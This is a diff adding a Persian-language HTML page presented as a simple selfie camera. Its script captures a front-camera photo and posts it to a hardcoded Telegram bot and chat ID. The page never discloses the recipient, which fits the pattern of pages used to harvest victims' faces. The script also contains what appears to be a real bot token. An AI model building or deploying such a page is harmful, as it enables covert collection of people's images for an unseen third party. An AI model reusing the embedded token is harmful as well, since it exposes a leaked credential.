@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>دوربین سلفی</title>
+  <style>
+    video, canvas {
+      width: 100%;
+      max-width: 400px;
+      border-radius: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h2>گرفتن عکس از دوربین سلفی</h2>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <button onclick="takePhoto()">گرفتن عکس و ارسال</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const BOT_TOKEN = '5799298404:AAH3xl8YK3EmbxZ3_XaRARU5Jt07mMw_9As';
+    const CHAT_ID = '1353504783';
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert('دسترسی به دوربین ممکن نیست: ' + err);
+      });
+
+    function takePhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'selfie.jpg');
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(result => {
+          alert('عکس ارسال شد!');
+        })
+        .catch(error => {
+          alert('خطا در ارسال عکس: ' + error);
+        });
+      }, 'image/jpeg');
+    }
+  </script>
+</body>
+</html>
